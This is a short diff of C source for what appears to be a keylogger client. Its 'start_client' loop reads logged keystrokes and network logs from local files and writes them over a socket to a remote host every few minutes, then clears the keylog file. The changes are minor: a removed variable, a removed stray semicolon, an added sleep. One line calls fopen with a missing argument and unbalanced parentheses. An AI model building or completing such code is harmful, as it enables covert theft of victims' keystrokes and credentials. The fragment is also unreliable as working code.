@@ -40,7 +40,6 @@ void start_client(void)
     while(1)
     {
         sleep(180); // wait 180sec = 3 min before sending logs again
-        int bytes_sent=0;
         
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open keylog file for writing*/
@@ -56,17 +55,16 @@ void start_client(void)
                 exit(0);
             }
         }
-
         /*Clear and close keylog file*/
         fclose(fopen("log/keylog.txt");
-        
+        sleep(5);
+               
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open network_log file for writing*/
         FILE *network_log = fopen("log/network.txt", "r");
         /*Write keylog file*/
         while(fscanf(network_log,"%s",send_buffer) != EOF)
         {
-            ;
             ret = write(sock, &send_buffer, sizeof(send_buffer));
             if(ret <=0){
                 perror("Error writing network log\n");
